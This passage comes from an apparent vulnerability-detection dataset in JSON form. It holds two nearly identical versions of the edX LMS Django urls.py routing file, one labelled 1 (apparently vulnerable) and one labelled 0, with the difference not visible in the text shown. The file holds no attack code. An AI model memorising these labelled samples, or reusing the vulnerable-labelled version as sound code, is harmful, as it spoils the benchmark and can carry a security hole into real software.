url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": 